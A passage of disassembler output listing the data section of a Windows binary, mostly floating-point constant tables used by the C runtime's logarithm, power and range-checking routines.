		dd 0B23E255Ch, 0A5503h,	6E735AB3h, 3C846984h, 5579FDBFh
		dd 0A9E6Bh, 92CB3387h, 3C8C1A77h, 995AD3ADh, 0AE89Fh, 0DC2D1D96h
		dd 3CA22466h, 0B84F15FAh, 0B33A2h, 0B19505AEh, 3CA1112Eh
		dd 0F2FB5E46h, 0B7F76h,	0A5FDDCDh, 3C74FFD7h, 904BC1D2h
		dd 0BCC1Eh, 30AF0CB3h, 3C736EAEh, 0DD85529Ch, 0C199Bh
		dd 0D10959ACh, 3C84E08Fh, 2E57D14Bh, 0C67F1h, 6C921968h
		dd 3C676B2Ch, 0DCEF9069h, 0CB720h, 36DF99B3h, 3C937009h
		dd 4A07897Bh, 0D072Dh, 0A63D07A7h, 3C74A385h, 0DCFBA487h
		dd 0D5818h, 0D5C192ACh,	3C8E5A50h, 3DB3285h, 0DA9E6h, 1C4A9792h
		dd 3C98BB73h, 337B9B5Eh, 0DFC97h, 603A88D3h, 3C74B604h
		dd 0E78B3FF6h, 0E502Eh,	92094926h, 3C916F27h, 0A2A490D9h
		dd 0EA4AFh, 41AA2008h, 3C8EC3BCh, 0EE615A27h, 0EFA1Bh
		dd 31D185EEh, 3C8A64A9h, 5B6E4540h, 0F5076h, 4D91CD9Dh
		dd 3C77893Bh, 819E90D8h, 0FA7C1h
qword_425130	dq 3FF0000000000000h	; DATA XREF: start_1+286r
		dd 0
		dd 100000h, 0FEFA39EFh,	40862E42h, 0BDD70000h, 0C086232h
dbl_425150	dq 1.797693134862316e308 ; DATA	XREF: start_1+258r
dbl_425158	dq 0.0			; DATA XREF: start_1:INF_NEGr
qword_425160	dq 7FEFFFFFFFFFFFFFh	; DATA XREF: start_1+217r
qword_425168	dq 10000000000000h	; DATA XREF: start_1:UFr
		dd 2 dup(3C300000h), 2 dup(45764CAh)
dbl_425180	dq 1.797693134862316e308 ; DATA	XREF: cintrinexit+D3r
dbl_425188	dq 2.225073858507201e-308 ; DATA XREF: cintrinexit+A5r
dbl_425190	dq -1536.0		; DATA XREF: cintrinexit+C3r
dbl_425198	dq 1536.0		; DATA XREF: cintrinexit+95r
dbl_4251A0	dq 1.797693134862316e308 ; DATA	XREF: cintrinexit+DFr
dbl_4251A8	dq 0.0			; DATA XREF: cintrinexit+B1r
xmmword_4251B0	xmmword	0FFFFFFFFFFFFF000FFFFFFFFFFFFFh	; DATA XREF: start_2+17r
					; start_2+170r
xmmword_4251C0	xmmword	428FFFFFFFFFF80F428FFFFFFFFFF80Fh ; DATA XREF: start_2+27r
xmmword_4251D0	xmmword	7FFFFFFFFFE000007FFFFFFFFFE00000h ; DATA XREF: start_2+2Fr
xmmword_4251E0	xmmword	3D2EF35793C767303FE62E42FEFA3800h ; DATA XREF: start_2+E3r
		dd 2 dup(0)
		dd 4 dup(0FFFFFFFFh), 2	dup(0)
xmmword_425210	xmmword	3FF00000000000003FF0000000000000h ; DATA XREF: start_2+1Fr
					; start_2+178r	...
xmmword_425220	xmmword	0		; DATA XREF: start_2+146r
qword_425230	dq 4330000000000000h	; DATA XREF: start_2:INPUT_DENORMr
		dd 0
		dd 43300000h
qword_425240	dq 0FFF0000000000000h	; DATA XREF: start_2+1B1r
dbl_425248	dq 1.797693134862316e308 ; DATA	XREF: start_2:INPUT_INFr
		dd 1, 7FF00000h, 1, 7FF00000h
xmmword_425260	xmmword	0BFCFFFFFFF201E133FC24998090DC555h ; DATA XREF:	start_2+B7r
xmmword_425270	xmmword	3FD55555555555A7BFC555C54DD57D75h ; DATA XREF: start_2+C3r
xmmword_425280	xmmword	0BFE000000000001C3FC9999998867A53h ; DATA XREF:	start_2+D7r
		dd 0
		dd 3FF00000h, 0
		dd 3FF00000h, 0
		dd 3FEF8200h, 0
		dd 3FEF8200h, 0
		dd 3FEF0800h, 0
		dd 3FEF0800h, 0
		dd 3FEE9200h, 0
		dd 3FEE9200h, 0
		dd 3FEE1E00h, 0
		dd 3FEE1E00h, 0
		dd 3FEDAE00h, 0
		dd 3FEDAE00h, 0
		dd 3FED4200h, 0
		dd 3FED4200h, 0
		dd 3FECD800h, 0
		dd 3FECD800h, 0
		dd 3FEC7200h, 0
		dd 3FEC7200h, 0
		dd 3FEC0E00h, 0
		dd 3FEC0E00h, 0
		dd 3FEBAC00h, 0
		dd 3FEBAC00h, 0
		dd 3FEB4E00h, 0
		dd 3FEB4E00h, 0
		dd 3FEAF200h, 0
		dd 3FEAF200h, 0
		dd 3FEA9800h, 0
		dd 3FEA9800h, 0
		dd 3FEA4200h, 0
		dd 3FEA4200h, 0
		dd 3FE9EC00h, 0
		dd 3FE9EC00h, 0
		dd 3FE99A00h, 0
		dd 3FE99A00h, 0
		dd 3FE94800h, 0
		dd 3FE94800h, 0
		dd 3FE8FA00h, 0
		dd 3FE8FA00h, 0
		dd 3FE8AC00h, 0
		dd 3FE8AC00h, 0
		dd 3FE86200h, 0
		dd 3FE86200h, 0
		dd 3FE81800h, 0
		dd 3FE81800h, 0
		dd 3FE7D000h, 0
		dd 3FE7D000h, 0
		dd 3FE78A00h, 0
		dd 3FE78A00h, 0
		dd 3FE74600h, 0
		dd 3FE74600h, 0
		dd 3FE70200h, 0
		dd 3FE70200h, 0
		dd 3FE6C200h, 0
		dd 3FE6C200h, 0
		dd 3FE68200h, 0
		dd 3FE68200h, 0
		dd 3FE64200h, 0
		dd 3FE64200h, 0
		dd 3FE60600h, 0
		dd 3FE60600h, 0
		dd 3FE5CA00h, 0
		dd 3FE5CA00h, 0
		dd 3FE58E00h, 0
		dd 3FE58E00h, 0
		dd 3FE55600h, 0
		dd 3FE55600h, 0
		dd 3FE51E00h, 0
		dd 3FE51E00h, 0
		dd 3FE4E600h, 0
		dd 3FE4E600h, 0
		dd 3FE4B000h, 0
		dd 3FE4B000h, 0
		dd 3FE47A00h, 0
		dd 3FE47A00h, 0
		dd 3FE44600h, 0
		dd 3FE44600h, 0
		dd 3FE41400h, 0
		dd 3FE41400h, 0
		dd 3FE3E200h, 0
		dd 3FE3E200h, 0
		dd 3FE3B200h, 0
		dd 3FE3B200h, 0
		dd 3FE38200h, 0
		dd 3FE38200h, 0
		dd 3FE35200h, 0
		dd 3FE35200h, 0
		dd 3FE32400h, 0
		dd 3FE32400h, 0
		dd 3FE2F600h, 0
		dd 3FE2F600h, 0
		dd 3FE2CA00h, 0
		dd 3FE2CA00h, 0
		dd 3FE29E00h, 0
		dd 3FE29E00h, 0
		dd 3FE27400h, 0
		dd 3FE27400h, 0
		dd 3FE24A00h, 0
		dd 3FE24A00h, 0
		dd 3FE22000h, 0
		dd 3FE22000h, 0
		dd 3FE1F800h, 0
		dd 3FE1F800h, 0
		dd 3FE1D000h, 0
		dd 3FE1D000h, 0
		dd 3FE1A800h, 0
		dd 3FE1A800h, 0
		dd 3FE18200h, 0
		dd 3FE18200h, 0
		dd 3FE15C00h, 0
		dd 3FE15C00h, 0
		dd 3FE13600h, 0
		dd 3FE13600h, 0
		dd 3FE11200h, 0
		dd 3FE11200h, 0
		dd 3FE0EC00h, 0
		dd 3FE0EC00h, 0
		dd 3FE0CA00h, 0
		dd 3FE0CA00h, 0
		dd 3FE0A600h, 0
		dd 3FE0A600h, 0
		dd 3FE08400h, 0
		dd 3FE08400h, 0
		dd 3FE06200h, 0
		dd 3FE06200h, 0
		dd 3FE04200h, 0
		dd 3FE04200h, 0
		dd 3FE02000h, 0
		dd 3FE02000h, 0
		dd 3FE00000h, 0
		dd 3FE00000h, 4	dup(0)
		dd 0B13C0000h, 3F8FBEA8h, 0B17E4E13h, 3CDEC927h, 16780000h
		dd 3F9F7A9Bh, 271BE7D7h, 3D242AD9h, 23C20000h, 3FA766D9h
		dd 2F1C24C1h, 3D1FF0A8h, 0C1114000h, 3FAF0C30h,	53BA4140h
		dd 3D31A886h, 9B63C000h, 3FB34517h, 0D36150D0h,	3D3D4203h
		dd 8C056000h, 3FB6EF52h, 51306A44h, 3D24573Ah, 3ECAC000h
		dd 3FBA956Dh, 4C02C4AFh, 3D3E6379h, 702AE000h, 3FBE2507h
		dd 3FD6EEDCh, 3D303B43h, 7CD48000h, 3FC0D79Eh, 847849E4h
		dd 3D3CB422h, 0C606000h, 3FC299D3h, 79DC08D9h, 3D3D4D00h
		dd 726F8000h, 3FC44F8Bh, 432B9BB4h, 3D3DF6A4h, 76E7A000h
		dd 3FC601B0h, 0D4DFC8E5h, 3D3152D7h, 16515000h,	3FC7B009h
		dd 0D3E606A3h, 3D146280h, 0A0044000h, 3FC9509Ah, 5B4D35C6h
		dd 3D3F1E67h, 5610D000h, 3FCAF689h, 0BA042B64h,	3D375BEBh
		dd 0CB9A8000h, 3FCC8DF7h, 0F58E1E6Eh, 3D3EEE42h, 7A6B2000h
		dd 3FCE2A87h, 7787081Ah, 3D382381h, 6EEE3000h, 3FCFB7D8h
		dd 1923FB43h, 3D371FCFh, 0E97BB000h, 3FD0A504h,	0E6690C44h
		dd 3D303094h, 0AECB9800h, 3FD1661Ch, 0C076A8Bh,	3D2D1C00h
		dd 0FBEF7800h, 3FD22981h, 7DA9FC99h, 3D17AF7Ah,	0BCE12000h
		dd 3FD2E9E2h, 128D1DC2h, 3D24300Ch, 56BB4800h, 3FD3A71Ch
		dd 0B5A88483h, 3D08C46Fh, 0C29C5800h, 3FD4610Bh, 833BCDC7h
		dd 3D385F4Dh, 93104000h, 3FD51D1Dh, 0A20D9C8Eh,	3D35B0FAh
		dd 0C49FF000h, 3FD5D01Dh, 8CFA5ED3h, 3D2740ABh,	244CF800h
		dd 3FD68518h, 0F88BF119h, 3D28722Fh, 0DC0800h, 3FD73C18h
		dd 0F75476C0h, 3D3320DBh, 3FA49800h, 3FD7E988h,	6743F289h
		dd 3D3FAFF9h, 8A893000h, 3FD898D3h, 71E2F57h, 3D31F666h
		dd 28036000h, 3FD94A04h, 0B08C6B44h, 3D30E7BCh,	0F4BF6800h
		dd 3FD9F123h, 15F2401Fh, 3D368920h, 0ABDB8000h,	3FDA99FCh
		dd 5F87A311h, 3D11E89Ch, 7C148800h, 3FDB4497h, 3FB526DBh
		dd 3D3C6A34h, 9E271800h, 3FDBEACDh, 0DB879B51h,	3D268A6Eh
		dd 0D6BB0800h, 3FDC92B7h, 0FF876CC2h, 3D10FE9Fh, 90C38000h
		dd 3FDD360Eh, 58440FD6h, 3D342CDBh, 4E1C000h, 3FDDD4AAh
		dd 2DF01AFDh, 3D32D851h, 62788800h, 3FDE74D2h, 0ED9457BCh
		dd 3CFEB945h, 6C2EB000h, 3FDF100Fh, 9D37F3D8h, 3D2CCE77h
		dd 9C9A9800h, 3FDFACC8h, 100EC76Ch, 3D163E0Dh, 0A5C9D000h
		dd 3FE02582h, 4E98E18Ch, 3D222C6Ch, 5C40DC00h, 3FE0720Eh
		dd 0B03FBEh, 3D38E274h,	0E7353800h, 3FE0BF52h, 9CD387D3h
		dd 3D19B589h, 9E2E4C00h, 3FE109EBh, 293E0BE7h, 3D12DA67h
		dd 0D3B8D400h, 3FE15533h, 0A8B0D3C3h, 3D3D981Ch, 0BA0BA400h
		dd 3FE19DB6h, 85A4A268h, 3D2B6758h, 676FF800h, 3FE1E6DFh
		dd 81B983AAh, 3D1A58BAh, 0D8BEBC00h, 3FE230B0h,	6E48667Bh
		dd 3D12FC06h, 1EC93C00h, 3FE2779Eh, 73359B79h, 3D365233h
		dd 0F9841C00h, 3FE2BF29h, 61D3B7ECh, 3CFD8A38h,	344F0C00h
		dd 3FE30757h, 5662F034h, 3D309BE8h, 0A8958000h,	3FE34C80h
		dd 0FCAC34BDh, 3D1D4093h, 0DDE5CC00h, 3FE39240h, 0EAB758B3h
		dd 3D3493DBh, 6B1A5400h, 3FE3D89Ah, 5FA81E3Eh, 3D28C7CDh
		dd 0F4860000h, 3FE41BCFh, 0B90E2A84h, 3D076FD6h, 0CF40DC00h
		dd 3FE4635Bh, 0D412CAADh, 3D2CE8D5h, 62342400h,	3FE4A3E8h
		dd 93F78464h, 3D224FA9h, 15786C00h, 3FE4E8D0h, 0D0303623h
		dd 3D38B1C0h, 269BC400h, 3FE52A6Dh, 68F689C9h, 3D300222h
		dd 0D71CF800h, 3FE56C91h, 0D1366E9Eh, 3CE07BAFh, 5B390400h
		dd 3FE5AB50h, 0F66563FAh, 3CD5627Ah, 0AA241800h, 3FE5EE82h
		dd 0CDA46BEh, 3D220238h, 0FEFA3800h, 3FE62E42h,	93C76730h
		dd 3D2EF357h
dbl_425AB0	dq 1.0			; DATA XREF: __convertTOStoQNaN:tosIsSNaNr
word_425AB8	dw 27Fh			; DATA XREF: _log+ABr
		dw 0C235h
		dd 0DAA22168h, 403EC90Fh
dbl_425AC4	dq 1.797693134862316e308 ; DATA	XREF: __check_range_exit+8Ar
dbl_425ACC	dq 2.225073858507201e-308 ; DATA XREF: __check_range_exit+61r
dbl_425AD4	dq -1536.0		; DATA XREF: __check_range_exit:haveoverflow_0r
dbl_425ADC	dq 1536.0		; DATA XREF: __check_range_exit:haveunderflow_0r
dbl_425AE4	dq 1.797693134862316e308 ; DATA	XREF: __check_range_exit+9Br
dbl_425AEC	dq 0.0			; DATA XREF: __check_range_exit+72r
		align 10h
qword_425B00	dq 3FF0000000000000h	; DATA XREF: __pow_pentium4+3Er
					; __pow_pentium4+47r ...
		dd 0
aAQ?		db '€Àï?',0
		align 4
		dd 3FEF8200h, 0
aAdq?		db '€Dï?',0
		align 4
aQ?		db 'À',7,'ï?',0
		align 4
		dd 3FEECC00h, 0
a@su?		db '@‘î?',0
		align 4
a@wu?		db '@Wî?',0
		align 4
		dd 3FEE1E00h, 0
aXa?		db 'Àåí?',0
		align 4
aAoa?		db '€®í?',0
		align 4
aWa?		db 'Àwí?',0
		align 4
aAa?		db 'ÀAí?',0
		align 4
		dd 3FED0CC0h, 0
a@?		db '@Øì?',0
		align 4
aD?		db 'À¤ì?',0
		align 4
aQ?_0		db 'Àqì?',0
		align 4
aA??		db '€?ì?',0
		align 4
		dd 3FEC0E00h, 0
a@I?		db '@Ýë?',0
		align 4
		dd 3FEBAD00h, 0
aAI?		db '€}ë?',0
		align 4
aAni?		db '€Në?',0
		align 4
a@I?_0		db '@ ë?',0
		align 4
		dd 3FEAF280h, 0
aA?		db '€Åê?',0
		align 4
		dd 3FEA9900h, 0
		dd 3FEA6D00h, 0
aA?_0		db 'ÀAê?',0
		align 4
		dd 3FEA16C0h, 0
aAS?		db '€ìé?',0
		align 4
aS?		db 'ÀÂé?',0
		align 4
aAss?		db '€™é?',0
		align 4
		dd 3FE97100h, 0
aHs?		db 'ÀHé?',0
		align 4
		dd 3FE92100h, 0
		dd 3FE8F9C0h, 0
		dd 3FE8D300h, 0
aMs?		db 'À¬è?',0
		align 4
		dd 3FE88700h, 0
aAas?		db '€aè?',0
		align 4
aAS?_0		db '€<è?',0
		align 4
		dd 3FE81800h, 0
		dd 3FE7F400h, 0
a@C?		db '@Ðç?',0
		align 4
a@nc?		db '@­ç?',0
		align 4
a@kc?		db '@Šç?',0
		align 4
aGc?		db 'Àgç?',0
		align 4
aEc?		db 'ÀEç?',0
		align 4
a@C?_0		db '@$ç?',0
		align 4
		dd 3FE70300h, 0
		dd 3FE6E200h, 0
aAC?		db '€Áæ?',0
		align 4
a@bc?		db '@¡æ?',0
		align 4
aAbc?		db '€æ?',0
		align 4
		dd 3FE66200h, 0
aBc?		db 'ÀBæ?',0
		align 4
		dd 3FE62400h, 0
		dd 3FE60580h, 0
a@cx?		db '@çå?',0
		align 4
aAX?		db '€Éå?',0
		align 4
		dd 3FE5AC00h, 0
aOx?		db 'ÀŽå?',0
		align 4
		dd 3FE57200h, 0
a@ux?		db '@Uå?',0
		align 4
		dd 3FE53900h, 0
		dd 3FE51D00h, 0
		dd 3FE50140h, 0
		dd 3FE4E600h, 0
aF?		db 'ÀÊä?',0
		align 4
aPf?		db 'À¯ä?',0
		align 4
a@xf?		db '@•ä?',0
		align 4
		dd 3FE47B00h, 0
aF?_0		db 'À`ä?',0
		align 4
		dd 3FE44700h, 0
aAF?		db '€-ä?',0
		align 4
		dd 3FE41400h, 0
		dd 3FE3FB00h, 0
a@tu?		db '@âã?',0
		align 4
aAU?		db '€Éã?',0
		align 4
a@U?		db '@±ã?',0
		align 4
		dd 3FE39900h, 0
a@bu?		db '@ã?',0
		align 4
aAiu?		db '€iã?',0
		align 4
		dd 3FE35200h, 0
		dd 3FE33B00h, 0
		dd 3FE32400h, 0
		dd 3FE30D00h, 0
		dd 3FE2F680h, 0
a@rt?		db '@àâ?',0
		align 4
		dd 3FE2CA00h, 0
		dd 3FE2B400h, 0
a@ut?		db '@žâ?',0
		align 4
aIt?		db 'Àˆâ?',0
		align 4
a@st?		db '@sâ?',0
		align 4
a@T?		db '@^â?',0
		align 4
a@it?		db '@Iâ?',0
		align 4
a@4t?		db '@4â?',0
		align 4
		dd 3FE21FC0h, 0
a@T?_0		db '@',0Bh,'â?',0
		align 4
		dd 3FE1F700h, 0
		dd 3FE1E300h, 0
		dd 3FE1CF00h, 0
a@S?		db '@»á?',0
		align 4
aZs?		db 'À§á?',0
		align 4
a@fs?		db '@”á?',0
		align 4
		dd 3FE18100h, 0
		dd 3FE16E00h, 0
		dd 3FE15B00h, 0
a@hs?		db '@Há?',0
		align 4
a5s?		db 'À5á?',0
		align 4
a@S?_0		db '@#á?',0
		align 4
		dd 3FE11100h, 0
		dd 3FE0FF00h, 0
		dd 3FE0ED00h, 0
a@R?		db '@Ûà?',0
		align 4
aAR?		db '€Éà?',0
		align 4
		dd 3FE0B800h, 0
aAjr?		db '€¦à?',0
		align 4
a@xr?		db '@•à?',0
		align 4
a@dr?		db '@„à?',0
		align 4
a@sr?		db '@sà?',0
		align 4
a@br?		db '@bà?',0
		align 4
aAqr?		db '€Qà?',0
		align 4
		dd 3FE04100h, 0
aA0r?		db '€0à?',0
		align 4
a@R?_0		db '@ à?',0
		align 4
		dd 3FE01000h, 0
		dd 3FE00000h, 2	dup(0)
xmmword_425F10	xmmword	0		; DATA XREF: __pow_pentium4+52r
					; __pow_pentium4+50Er
		dd 61D20000h, 3F86FDF4h, 46D9F6F7h, 3D3C9EFCh, 317A0000h
		dd 3F96E625h, 645614DBh, 3D453F0Eh, 97920000h, 3FA11A62h
		dd 0D7D436D6h, 3D4D925Ch, 0A01F0000h, 3FA6BB01h, 7439DB70h
		dd 3D3C995Eh, 635C8000h, 3FAC4EB3h, 0BDCAD609h,	3D4A8192h
		dd 80338000h, 3FB0EA8Bh, 942F1BE5h, 3D4E1797h, 62A90000h
		dd 3FB3A9F0h, 2E155A44h, 3D3011EFh, 4FF80000h, 3FB66568h
		dd 8DA93FAFh, 3D3084F2h, 335D0000h, 3FB919BCh, 0ED03FE7Fh
		dd 3D246082h, 0D7C04000h, 3FBBC6B9h, 42652658h,	3D45B7E8h
		dd 0E1DC8000h, 3FBE7272h, 2333A25Ch, 3D4A2EA9h,	820EC000h
		dd 3FC08CD7h, 11B40206h, 3D3543C5h, 3A33C000h, 3FC1DC8Fh
		dd 0AB6D744Ch, 3D45598Ch, 27AF4000h, 3FC32B7Ah,	0FD6522B1h
		dd 3D07ABA1h, 4C740000h, 3FC47656h, 249B8F70h, 3D4DC39Fh
		dd 64906000h, 3FC5C048h, 7E5F3668h, 3D28C5D4h, 0EF786000h
		dd 3FC707A4h, 591DE6F8h, 3D4F86EAh, 0FAC38000h,	3FC84C59h
		dd 51B14A77h, 3D435CD3h, 6AACC000h, 3FC98E55h, 0D156EE10h
		dd 3D341C88h, 32BE000h,	3FCACF30h, 0DEBF9165h, 3D2E3733h
		dd 13AE6000h, 3FCC0D32h, 0B18BE2EDh, 3D4B15BCh,	0D6D66000h
		dd 3FCD49F9h, 0C2A12D29h, 3D30B557h, 8A2D0000h,	3FCE83C9h
		dd 0D10D18F2h, 3D442AF5h, 0E396E000h, 3FCFBC44h, 28665437h
		dd 3D47B3F9h, 936E000h,	3FD078D4h, 8125902h, 3D38F1F6h
		dd 25B29000h, 3FD112CEh, 0F45BAE5h, 3D3C851Ch, 77E3F000h
		dd 3FD1AC0Bh, 0B047EA3h, 3D3F9710h, 90D2B000h, 3FD243A5h
		dd 0E8E9D45Dh, 3D3C9B75h, 0AD935000h, 3FD2DB57h, 238AC23Eh
		dd 3CF934F5h, 0BE940000h, 3FD37158h, 42E3F4DEh,	3D4A16D1h
		dd 445FB000h, 3FD40684h, 4BFBFC6Dh, 3D469BA1h, 0A118D000h
		dd 3FD49AD4h, 7302CCA5h, 3D45CD37h, 0E2114000h,	3FD52D5Bh
		dd 0F883E4Bh, 3D3A8364h, 67828000h, 3FD5BFE3h, 3DEA7D5Ah
		dd 3D49755Ch, 94738000h, 3FD6517Eh, 223A67C4h, 3D4E8A28h
		dd 92EF1000h, 3FD6E227h, 0E7E9039h, 3D314F24h, 7FD10000h
		dd 3FD771D8h, 31D36EDBh, 3D258AAFh, 6B297000h, 3FD8008Bh
		dd 8CCAD976h, 3D1605B8h, 58A56000h, 3FD88E3Ah, 572E71DFh
		dd 3D2097FFh, 9E695000h, 3FD91BD1h, 0E4F6C667h,	3D4DBB3Eh
		dd 0ABBE1000h, 3FD9A85Bh, 0A61B2D6h, 3D4D889Ah,	5FCB1000h
		dd 3FDA33D2h, 0D92C8DD6h, 3D4F5875h, 8EC96000h,	3FDABE2Fh
		dd 90E2CC83h, 3D3C7731h, 273ED000h, 3FDB4865h, 99E1F60h
		dd 3D4AB54Ah, 0E781000h, 3FDBD07Eh, 1C0DCF20h, 3D268AC2h
		dd 0BA6E1000h, 3FDC5960h, 96CB81FEh, 3D43B4BDh,	8B913000h
		dd 3FDCE116h, 55D19E2h,	3D2FADA3h, 20231000h, 3FDD6799h
		dd 96E87504h, 3D18ED50h, 0DFFC000h, 3FDDECE2h, 2CED8AAAh
		dd 3D43E26Ch, 0AD35F000h, 3FDE71EBh, 0E08E95E1h, 3D011609h
		dd 0D3444000h, 3FDEF6B3h, 2D1614FAh, 3D40B35Bh,	9E747000h
		dd 3FDF7A34h, 81D99120h, 3D4A6E70h, 9E8CC000h, 3FDFFD6Ch
		dd 2E86699Dh, 3CFA6745h, 7E79F000h, 3FE03FA9h, 0E74F8BEEh
		dd 3D275E12h, 8D542800h, 3FE08074h, 78CE0ADBh, 3D3B8C3Bh
		dd 50CF0000h, 3FE0C116h, 0EB1152A5h, 3D461752h,	26B18000h
		dd 3FE10108h, 8A07D258h, 3D4EA3C9h, 0DD4AE800h,	3FE140CCh
		dd 197ED2C1h, 3D1FCADAh, 3D744800h, 3FE18063h, 7E07A41h
		dd 3D225517h, 6E8E9800h, 3FE1BF42h, 6C055F55h, 3D376AFFh
		dd 5DB3A000h, 3FE1FDEFh, 8501D871h, 3D4442DEh, 0C8201000h
		dd 3FE23C68h, 9129A57Ah, 3D270C74h, 0A05A8000h,	3FE27A23h
		dd 30B214A6h, 3D4CB0EAh, 1C354000h, 0BFDA8F9Dh,	4F4F9853h
		dd 0BD4604F5h, 0AEE3B000h, 0BFDA1506h, 0DBB28C80h, 0BD44FF93h
		dd 8AA53000h, 0BFD99AE4h, 3DFDF5h, 0BD0E6ED7h, 57DF2000h
		dd 0BFD92139h, 0C01B3F7Fh, 0BD3E186Ah, 8A043000h, 0BFD8A922h
		dd 0CF8DD883h, 0BD49BC20h, 0BF51C000h, 0BFD8306Eh, 6E480596h
		dd 0BD45C826h, 57F9000h, 0BFD7B83Ah, 9F443745h,	0BD35F4F7h
		dd 37FCA000h, 0BFD741A6h, 9FF0180Dh, 0BD4025F4h, 0E7AA4000h
		dd 0BFD6CB99h, 0D5A7002Ah, 0BD412B5Ah, 0E853D000h, 0BFD654F5h
		dd 8C4A72A7h, 0BD44C700h, 91D34000h, 0BFD5DFFFh, 0D390BA95h
		dd 0BD3F544Eh, 33779000h, 0BFD56B99h, 31BAE772h, 0BD391DC0h
		dd 5D830000h, 0BFD4F69Fh, 0D24BAE46h, 0BD38F36Dh, 2143D000h
		dd 0BFD48360h, 9A327931h, 0BCE09C59h, 8A0D4000h, 0BFD410B9h
		dd 28E8042Ah, 0BD156A3Ch, 0E4060000h, 0BFD39D83h, 43C10456h
		dd 0BD447F16h, 0F8B57000h, 0BFD32C15h, 0E01D9231h, 0BD0D6EE2h
		dd 891F000h, 0BFD2BA1Ch, 6C3DA632h, 0BD379507h,	0ADA03000h
		dd 0BFD249F2h, 0FEB5964Fh, 0BD2A7809h, 6C900000h, 0BFD1D940h
		dd 3EA7C032h, 0BD4546D7h, 0D34FB000h, 0BFD16935h, 348D84A4h
		dd 0BD2151C6h, 3A3FD000h, 0BFD0FB09h, 943A5h, 0BD2BACACh
		dd 8CDA7000h, 0BFD08C58h, 4F78DFA1h, 0BD43C72Ch, 8CF40000h
		dd 0BFD01D22h, 0C813E541h, 0BD3C6972h, 7E71A000h, 0BFCF5FAAh
		dd 20C552C1h, 0BD3D1576h, 93DC000h, 0BFCE867Eh,	0F3FFFCC0h
		dd 0BD366FA6h, 0FE6D4000h, 0BFCDAC50h, 0BB8F2009h, 0BD2B6484h
		dd 0E83E8000h, 0BFCCD398h, 0E492C839h, 0BD05F5CDh, 1D5BE000h
		dd 0BFCBFC5Ch, 0E42B538h, 0BD278490h, 0FB83E000h, 0BFCB26A0h
		dd 0E91F69B7h, 0BD4A5B99h, 5ABBA000h, 0BFCA4FEDh, 8062C61Fh
		dd 0BD45976Eh, 0E2448000h, 0BFC97D45h, 6755CD02h, 0BD401C63h
		dd 948A000h, 0BFC8A9ADh, 64F25A55h, 0BD4C89BAh,	0A4220000h
		dd 0BFC7D520h, 0D008A53Dh, 0BD216A44h, 0C17F0000h, 0BFC704B6h
		dd 6D56D6EEh, 0BD413A80h, 9CB64000h, 0BFC63360h, 177EC11Ch
		dd 0BD33F125h, 0FF6B0000h, 0BFC563ADh, 79422C3h, 0BD4D0837h
		dd 82FF2000h, 0BFC495A5h, 13709EF4h, 0BD3EBD93h, 2529A000h
		dd 0BFC3C6B6h, 8296BF5Ch, 0BD42D2B0h, 6AD2E000h, 0BFC2F978h
		dd 0C2483623h, 0BD3B5188h, 2746000h, 0BFC22DF3h, 0C2505D3Dh
		dd 0BD3048E3h, 543B8000h, 0BFC1618Ch, 0A3B61BD1h, 0BD45B8D6h
		dd 0A2260000h, 0BFC096E5h, 232D61F6h, 0BD4BDE98h, 5C568000h
		dd 0BFBF9C0Bh, 0B7A56256h, 0BD4D3483h, 92EE4000h, 0BFBE0894h
		dd 0FCD57F86h, 0BD405589h, 0E5580000h, 0BFBC78BAh, 387C197h
		dd 0BD35351Dh, 0FAF64000h, 0BFBAEC8Bh, 0ABEA0E44h, 0BD3D13CBh
		dd 4969C000h, 0BFB95EB2h, 0B299D747h, 0BD3727FAh, 41A08000h
		dd 0BFB7D493h, 0BCF7AA55h, 0BD4EEEF8h, 0AA930000h, 0BFB64E3Ch
		dd 31E3ECAh, 0BD31AAD2h, 0D2EA8000h, 0BFB4C647h, 115C4FB7h
		dd 0BCEB43C4h, 94A24000h, 0BFB3422Bh, 3A67E318h, 0BD421B49h
		dd 0CF5A4000h, 0BFB1BC75h, 139E8397h, 0BD4D7DB2h, 0F8DC8000h
		dd 0BFB03AA8h, 0E9AF5428h, 0BD153121h, 0F48F8000h, 0BFAD6E8Eh
		dd 51765DBCh, 0BD38293Ch, 0D7680000h, 0BFAA6FBEh, 0DB7CD724h
		dd 0BD2B1C66h, 0C1828000h, 0BFA778FDh, 0F2AF5332h, 0BD34378Ah
		dd 22550000h, 0BFA47F2Eh, 93C56DCDh, 0BD2A4246h, 0A5368000h
		dd 0BFA18249h, 5FDF534Bh, 0BD441B0Dh, 0EE200000h, 0BF9D1B35h
		dd 2DB4F24Dh, 0BD431FB7h, 317A0000h, 0BF97427Dh, 4B03B093h
		dd 0BD4700F1h, 0D100000h, 0BF9163D2h, 664FE33Fh, 0BD46E8B9h
		dd 4CF00000h, 0BF872C1Fh, 580FE573h, 0BD2B4934h, 6D780000h
		dd 0BF7709C4h, 56CDE924h, 0BD4563BAh, 4	dup(0)
qword_426720	dq 3FF0000000000000h	; DATA XREF: __pow_pentium4+B9r
					; __pow_pentium4+C2r
		dd 0
		dd 3FEFFF40h, 0
		dd 3FEFFE40h, 0
		dd 3FEFFD40h, 0
		dd 3FEFFC40h, 0
		dd 3FEFFB40h, 0
		dd 3FEFFA40h, 0
		dd 3FEFF940h, 0
		dd 3FEFF840h, 0
		dd 3FEFF740h, 0
		dd 3FEFF640h, 0
		dd 3FEFF540h, 0
		dd 3FEFF440h, 0
		dd 3FEFF340h, 0
		dd 3FEFF240h, 0
		dd 3FEFF140h, 0
		dd 3FEFF040h, 0
a@qq?		db '@ïï?',0
		align 4
a@uq?		db '@îï?',0
		align 4
a@aq?		db '@íï?',0
		align 4
a@Q?		db '@ìï?',0
		align 4
a@iq?		db '@ëï?',0
		align 4
a@Q?_0		db '@êï?',0
		align 4
a@sq?		db '@éï?',0
		align 4
a@sq?_0		db '@èï?',0
		align 4
a@cq?		db '@çï?',0
		align 4
a@cq?_0		db '@æï?',0
		align 4
a@xq?		db '@åï?',0
		align 4
a@fq?		db '@äï?',0
		align 4
a@uq?_0		db '@ãï?',0
		align 4
a@tq?		db '@âï?',0
		align 4
a@sq?_1		db '@áï?',0
		align 4
a@rq?		db '@àï?',0
		align 4
a@Q?_1		db '@ßï?',0
		align 4
a@Q?_2		db '@Þï?',0
		align 4
a@Q?_3		db '@Ýï?',0
		align 4
a@Q?_4		db '@Üï?',0
		align 4
a@Q?_5		db '@Ûï?',0
		align 4
a@Q?_6		db '@Úï?',0
		align 4
a@Q?_7		db '@Ùï?',0
		align 4
a@Q?_8		db '@Øï?',0
		align 4
a@Q?_9		db '@×ï?',0
		align 4
a@Q?_10		db '@Öï?',0
		align 4
a@Q?_11		db '@Õï?',0
